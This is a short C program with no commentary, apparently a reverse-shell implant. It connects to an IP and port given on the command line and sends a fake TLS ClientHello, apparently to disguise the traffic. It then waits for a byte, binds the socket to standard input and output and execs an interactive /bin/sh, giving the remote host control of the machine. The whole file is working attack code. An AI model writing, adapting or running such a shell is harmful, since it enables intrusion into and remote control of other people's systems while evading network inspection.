#define _GNU_SOURCE
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>

static const uint8_t CLIENT_HELLO[] = {
    0x16, 0x03, 0x01, 0x00, 0x2f,
    0x01, 0x00, 0x00, 0x2b, 0x03, 0x03,

    0x5e,0x8a,0x2f,0x1c,0x3b,0x7d,0x9e,0x4a,
    0x1f,0x6c,0x2e,0x8b,0x5d,0x0a,0x3f,0x7c,
    0x4e,0x9b,0x2c,0x6d,0x1a,0x8e,0x5f,0x3c,
    0x7a,0x0d,0x4b,0x9c,0x2a,0x6e,0x1b,0x8f,
    0x00,
    0x00,0x02,
    0x00,0x2f,
    0x01,0x00,
    0x00,0x00,
};

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    const char *host = argv[1];
    uint16_t    port = (uint16_t)atoi(argv[2]);

    int s = (int)syscall(SYS_socket, AF_INET, SOCK_STREAM, 0);
    if (s < 0) { perror("socket"); return 1; }

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET; sa.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) <= 0) {
        fprintf(stderr, "bad IP\n"); return 1;
    }
    if ((int)syscall(SYS_connect, s, &sa, sizeof(sa)) < 0) {
        perror("connect"); return 1;
    }

    send(s, CLIENT_HELLO, sizeof(CLIENT_HELLO), 0);

    uint8_t ack;
    recv(s, &ack, 1, 0);

    dup2(s, 0); dup2(s, 1); dup2(s, 2); close(s);
    setsid();
    char *sh[] = { "/bin/sh", "-i", NULL };
    execve("/bin/sh", sh, environ);
    perror("execve");
    return 1;
}
